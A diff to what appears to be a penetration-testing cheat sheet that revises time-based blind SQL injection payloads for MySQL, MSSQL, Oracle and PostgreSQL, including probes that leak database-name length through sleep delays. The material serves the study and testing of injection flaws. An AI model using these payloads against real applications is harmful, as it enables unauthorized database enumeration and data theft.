@@ -13,7 +13,7 @@ The process is relatively the same as [Boolean Based](boolean-based.md) injectio
 A time-based SQLi payload in MySQL will look like this
 
 ```bash
-1' AND IF (YOUR-CONDITION-HERE, sleep(3),'false')-- -
+1'; SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')-- -
 ```
 
 Examples:
@@ -23,7 +23,7 @@ Examples:
 1' AND (SELECT LENGTH(database()))=1-- -
 
 #Time Based  
-1' AND IF ((SELECT LENGTH(database()))=1, sleep(3),'false') -- -
+1'; SELECT IF((SELECT LENGTH(database()))=1,SLEEP(10),'a')-- -
 ```
 {% endtab %}
 
@@ -31,7 +31,7 @@ Examples:
 A time-based SQLi payload in MSSQL will look like this
 
 ```bash
-1' AND IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'-- 
+1' IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'-- 
 ```
 
 Examples:
@@ -41,7 +41,7 @@ Examples:
 1' AND (SELECT LEN(DB_NAME()))=1--
 
 #Time Based  
-1' AND IF ((SELECT LEN(DB_NAME()))=1) WAITFOR DELAY '0:0:10'-- 
+1' IF ((SELECT LEN(DB_NAME()))=1) WAITFOR DELAY '0:0:10'-- 
 ```
 {% endtab %}
 
@@ -49,7 +49,7 @@ Examples:
 A time-based SQLi payload in OracleSQL will look like this
 
 ```bash
-1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--
+1' || (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual) ||'--
 ```
 
 Examples:
@@ -59,7 +59,7 @@ Examples:
 1' AND (SELECT LENGTH(global_name) FROM global_name)=1--
 
 #Time Based  
-1' AND CASE WHEN ((SELECT LENGTH(global_name) FROM global_name)=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--
+1' || (SELECT CASE WHEN ((SELECT LENGTH(global_name) FROM global_name)=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual) ||'--
 ```
 {% endtab %}
 
@@ -67,7 +67,7 @@ Examples:
 A time-based SQLi payload in PostgreSQL will look like this
 
 ```bash
-1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+1'; SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 ```
 
 Examples:
@@ -77,7 +77,7 @@ Examples:
 1' AND (SELECT LENGTH(current_database()))=1--
 
 #Time Based  
-1' AND CASE WHEN ((SELECT LENGTH(current_database()))=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+1'; SELECT CASE WHEN ((SELECT LENGTH(current_database()))=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 ```
 {% endtab %}
 
